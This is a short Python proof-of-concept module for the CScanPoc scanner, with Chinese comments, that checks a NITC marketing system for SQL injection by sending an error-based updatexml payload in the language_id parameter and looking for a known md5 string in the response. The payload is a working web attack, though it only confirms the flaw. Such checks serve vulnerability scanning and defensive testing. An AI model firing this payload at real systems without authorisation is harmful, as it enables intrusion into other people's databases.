# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'NITC_0007' # 平台漏洞编号，留空
    name = 'NITC营销系统SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-12-24'  # 漏洞公布时间
    desc = '''
        NITC营销系统 /index.php?language_id=1 SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0152825
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = 'NITC'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b2b5ab2c-4d3d-4a73-8708-c4af0a651e8c'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + "/index.php?language_id=1%20or%20updatexml(1,concat(0x5c,md5(1)),1)%23--&is_protect=1&action=test"
            code, head, res, errcode, _ = hh.http(url)
            if code!=0 and 'c4ca4238a0b923820dcc509a6f75849' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()